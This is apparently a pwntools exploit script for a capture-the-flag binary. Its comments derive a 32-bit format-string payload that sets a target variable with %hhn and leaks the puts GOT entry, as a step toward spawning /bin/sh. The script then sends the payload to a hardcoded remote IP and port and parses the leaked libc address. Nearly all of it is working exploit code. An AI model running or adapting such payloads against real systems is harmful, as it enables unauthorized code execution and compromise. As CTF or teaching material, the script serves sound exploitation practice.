from pwn import *

context(arch='i386', os='linux', log_level='info')

elf = ELF('pwn_permission')

# New approach: Use format string to leak puts address via %s
# AND set target_val = 5 via %n in the SAME format string
# Then use the buffer overflow to call system("/bin/sh")

# The format string buffer is 32 bytes (0x20)
# Format string offset is 4

# Key insight: We can put addresses at the END of the format string
# and use positional format specifiers to reference them

# Payload layout:
# [format specifiers] [padding] [addr1] [addr2]
# 
# We need:
# - %4$hhn to write to target_val_addr (position 4)
# - %5$s to read from puts_got (position 5)
# 
# But position 4 = bytes 0-3, position 5 = bytes 4-7
# If we put format specifiers first, positions 4,5 won't be the addresses

# Wait, I need to reconsider. In 32-bit format string:
# The format string itself is on the stack
# Position 4 = first 4 bytes of our buffer
# Position 5 = next 4 bytes
# etc.

# So if we want position 4 to be target_val_addr:
# bytes 0-3 = p32(target_val_addr)
# bytes 4-7 = p32(puts_got)
# Then: %4$n writes to target_val_addr, %5$s reads from puts_got

# But the problem is: the address bytes are printed as literal characters
# and they count toward %n's count

# Let's calculate:
# p32(target_val_addr) = \x30\xc0\x04\x08 (4 bytes printed)
# p32(puts_got) = \x14\xc0\x04\x08 (4 bytes printed)
# Total before any format specifier = 8 bytes

# We need target_val = 5, so we need to print exactly 5 bytes before %4$n
# But we've already printed 8 bytes (the two addresses)!

# Solution: Use %hhn instead of %n
# %hhn writes only the least significant byte
# We need the LSB to be 5 (0x05)
# So we need to print 5 bytes total before %4$hhn
# But we've printed 8 bytes already...

# Alternative: Put only ONE address at the start
# p32(target_val_addr) + %1c%4$hhn + padding + p32(puts_got) + %5$s
# Wait, this doesn't work because %5$s needs position 5 to be puts_got

# Let me try: put target_val_addr at position 4, and puts_got at a later position
# p32(target_val_addr) + %1c%4$hhn + padding + p32(puts_got) + %7$s
# Position 4 = bytes 0-3 = target_val_addr
# Position 5 = bytes 4-7 = "%1c%4" 
# Position 6 = bytes 8-11 = "$hhn" + pad
# Position 7 = bytes 12-15 = puts_got

# Let me calculate more carefully:
# p32(target_val_addr) = 4 bytes (positions 4)
# "%1c%4$hhn" = 9 bytes
# Total so far = 13 bytes
# Need padding to align puts_got to position boundary
# 13 bytes -> need 3 more bytes to reach 16 (position 8)
# Wait: position = 4 + byte_offset/4
# byte_offset 12 -> position 4 + 3 = 7
# byte_offset 16 -> position 4 + 4 = 8

# So: p32(target_val_addr) + "%1c%4$hhn" + "\x00\x00\x00" + p32(puts_got) + "%8$s"
# But null bytes will terminate printf!

# Alternative: use "AAA" as padding (3 bytes)
# p32(target_val_addr) + "%1c%4$hhn" + "AAA" + p32(puts_got) + "%8$s"
# Total = 4 + 9 + 3 + 4 + 4 = 24 bytes (fits in 32!)

# But wait, the "AAA" padding will also be printed (3 more bytes)
# So total printed before %4$hhn = 4 (addr) + 1 (%1c) = 5
# %4$hhn writes 0x05 to target_val_addr ✓

# Then after %4$hhn, "AAA" is printed (3 bytes, total = 8)
# Then p32(puts_got) is printed (4 bytes, total = 12)
# Then %8$s prints the string at puts_got (the puts@libc address)

# Wait, but %8$s references position 8
# Position 8 = bytes (8-4)*4 = 16-19 of our buffer
# Our buffer: 
# 0-3: target_val_addr
# 4-12: "%1c%4$hhn" (9 bytes)
# 13-15: "AAA" (3 bytes)
# 16-19: puts_got
# 20-23: "%8$s" (4 bytes)
# Total = 24 bytes

# Position 8 = bytes 16-19 = puts_got ✓

# But there's a problem: the puts@libc address will contain null bytes
# When %5$s prints the string at puts_got, it will stop at the first null
# A typical libc address like 0xf7d6a1e0 in little-endian is \xe0\xa1\xd6\xf7
# No null bytes until the end! So puts will print 4 bytes ✓

# But wait, the format string itself contains the puts_got address
# \x14\xc0\x04\x08 - no null bytes ✓

# Let me also check: will printf process the entire format string correctly?
# The format string is: \x30\xc0\x04\x08%1c%4$hhnAAA\x14\xc0\x04\x08%8$s
# printf will:
# 1. Print \x30\xc0\x04\x08 (4 bytes, total=4)
# 2. Process %1c -> print 1 char (total=5)
# 3. Process %4$hhn -> write 5 to *target_val_addr (LSB = 0x05)
# 4. Print "AAA" (3 bytes, total=8)
# 5. Print \x14\xc0\x04\x08 (4 bytes, total=12)
# 6. Process %8$s -> print string at *puts_got (puts@libc address)

# This should work!

target_val_addr = 0x804c030
puts_got = elf.got['puts']  # 0x804c014

# Construct the combined format string payload
fmt_payload = p32(target_val_addr)   # position 4 (bytes 0-3)
fmt_payload += b'%1c%4$hhn'          # write 5 to target_val (bytes 4-12, 9 bytes)
fmt_payload += b'AAA'                 # padding (bytes 13-15, 3 bytes)
fmt_payload += p32(puts_got)          # position 8 (bytes 16-19)
fmt_payload += b'%8$s'               # leak puts@libc (bytes 20-23)

log.info(f"Combined format string payload: {fmt_payload}")
log.info(f"Payload length: {len(fmt_payload)}")
log.info(f"Payload hex: {fmt_payload.hex()}")

# Test it
conn = remote('39.96.193.120', 10000)

# Receive initial message
conn.recv(timeout=5)

# Send the combined format string
conn.send(fmt_payload)

import time
time.sleep(2)

# Receive the response
response = conn.recv(timeout=5)
log.info(f"Response: {response}")
log.info(f"Response hex: {response.hex()}")

# The response should contain:
# 1. "Hope you have a good time here.\n"
# 2. The format string output (including the leaked puts address)
# 3. Either "Input:\n" (if target_val was set to 5) or "Alright, it doesn't matter.\n"

# Let's check if we got the "Input:" prompt
if b'Input:' in response:
    log.success("target_val was set to 5! vuln() was called!")
else:
    log.error("target_val was NOT set to 5")

# Extract the leaked puts address
# The format string output is after "Hope you have a good time here.\n"
# and before "Input:\n" or "Alright..."
idx = response.find(b'here.\n')
if idx >= 0:
    after_here = response[idx+6:]
    log.info(f"After 'here.': {after_here.hex()}")
    
    # The format string output starts with the address bytes + %1c output + "AAA" + puts_got bytes + leaked puts addr
    # \x30\xc0\x04\x08 + 1 char + AAA + \x14\xc0\x04\x08 + leaked_puts_addr
    # The leaked puts address is at the end, before "Input:\n" or "Alright..."
    
    # Find the end marker
    end_idx = after_here.find(b'Input:')
    if end_idx < 0:
        end_idx = after_here.find(b'Alright')
    if end_idx < 0:
        end_idx = len(after_here)
    
    fmt_output = after_here[:end_idx]
    log.info(f"Format string output: {fmt_output.hex()}")
    
    # The leaked address is after the literal address bytes
    # Format: [4 bytes target_val_addr] [1 byte from %1c] [3 bytes "AAA"] [4 bytes puts_got] [leaked puts addr]
    # Total header = 12 bytes, then the leaked address
    
    if len(fmt_output) >= 12:
        leaked = fmt_output[12:]
        log.info(f"Leaked data: {leaked.hex()}")
        if len(leaked) >= 4:
            puts_leak = u32(leaked[:4])
            log.info(f"Leaked puts address: 0x{puts_leak:x}")

conn.close()